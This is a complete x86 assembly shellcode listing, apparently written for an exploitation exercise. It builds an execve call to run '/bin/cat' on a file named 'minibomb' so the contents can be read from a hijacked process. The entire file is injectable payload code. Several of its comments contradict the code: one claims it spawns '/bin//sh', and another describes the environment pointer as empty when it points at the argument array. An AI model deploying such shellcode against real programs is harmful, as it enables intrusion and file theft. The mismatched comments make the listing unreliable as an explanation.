BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor ecx, ecx      ; zero out ecx
  xor eax, eax      ; make sure eax is zeroed again
  mov al, 11        ; syscall #11
  push ecx          ; push some nulls for string termination
  push 0x7461632f   ; push "/cat" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin/cat" into ebx, via esp
  push ecx
  push 0x626d6f62
  push 0x696e696d
  mov edx, esp
  push ecx          ; push 32-bit null terminator to stack
  push edx
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  mov edx, esp      ; this is an empty array for envp
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
